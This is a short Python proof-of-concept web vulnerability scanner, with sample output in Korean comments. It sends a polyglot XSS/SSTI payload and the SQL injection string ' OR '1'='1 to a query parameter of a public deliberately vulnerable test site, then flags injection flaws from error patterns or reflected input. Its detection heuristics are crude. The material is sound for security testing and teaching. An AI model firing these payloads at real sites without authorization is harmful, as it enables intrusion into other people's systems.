'''
예시 PoC 실행 결과:
[+] 스캔 결과 - http://testphp.vulnweb.com/listproducts.php?cat=

[+] 공통 페이로드 결과
취약점 유형: sql_injection
신뢰도: 80.0%
페이로드: '"<script>{{7*7}}</script><!--
근거: SQL 에러 패턴 발견
--------------------------------------------------
취약점 유형: xss
신뢰도: 70.0%
페이로드: '"<script>{{7*7}}</script><!--
근거: 페이로드가 응답에서 필터링되지 않음
--------------------------------------------------

[+] SQL Injection 분석 결과
취약점 유형: sql_injection
신뢰도: 100.0%
페이로드: ' OR '1'='1
근거: SQL 에러 패턴 발견
--------------------------------------------------
'''

from dataclasses import dataclass
from typing import Dict, List, Optional
from enum import Enum
import requests
import re
import time

class VulnType(Enum):
    SQLI = "sql_injection"
    XSS = "xss"
    SSTI = "ssti"
    LFI = "lfi"

@dataclass
class ScanResult:
    vuln_type: VulnType
    confidence: float
    payload: str
    evidence: str

class Fuzzmap:
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        self.base_response = self._get_base_response()
        
    def _get_base_response(self) -> requests.Response:
        return self.session.get(self.url + "1")
    
    def _send_payload(self, payload: str) -> requests.Response:
        return self.session.get(self.url + payload)
    
    def _analyze_response(self, response: requests.Response, payload: str) -> List[ScanResult]:
        results = []
        
        # SQL Injection 분석
        sql_patterns = ["SQL syntax", "mysql_error", "ORA-", "SQLite"]
        if any(pattern.lower() in response.text.lower() for pattern in sql_patterns):
            results.append(ScanResult(
                vuln_type=VulnType.SQLI,
                confidence=0.8,
                payload=payload,
                evidence="SQL 에러 패턴 발견"
            ))
            
        # XSS 분석
        if payload in response.text and any(char in payload for char in "<>'\""):
            results.append(ScanResult(
                vuln_type=VulnType.XSS,
                confidence=0.7,
                payload=payload,
                evidence="페이로드가 응답에서 필터링되지 않음"
            ))
            
        # SSTI 분석
        if "49" in response.text and "{{7*7}}" in payload:
            results.append(ScanResult(
                vuln_type=VulnType.SSTI,
                confidence=0.9,
                payload=payload,
                evidence="템플릿 표현식이 실행됨"
            ))
            
        return results

    def scan(self) -> List[ScanResult]:
        # 공통 페이로드
        initial_payload = "'\"<script>{{7*7}}</script><!--"
        response = self._send_payload(initial_payload)
        results = self._analyze_response(response, initial_payload)
        
        # 취약점 별 심화 스캔
        if any(r.vuln_type == VulnType.SQLI for r in results):
            deep_sql_payload = "' OR '1'='1"
            sql_response = self._send_payload(deep_sql_payload)
            results.extend(self._analyze_response(sql_response, deep_sql_payload))
            
        return results

def main():
    target = "http://testphp.vulnweb.com/listproducts.php?cat="
    fuzzer = Fuzzmap(target)
    results = fuzzer.scan()
    
    print(f"\n[+] 스캔 결과 - {target}\n")
    for result in results:
        print(f"취약점 유형: {result.vuln_type.value}")
        print(f"신뢰도: {result.confidence * 100}%")
        print(f"페이로드: {result.payload}")
        print(f"근거: {result.evidence}")
        print("-" * 50)

if __name__ == "__main__":
    main() 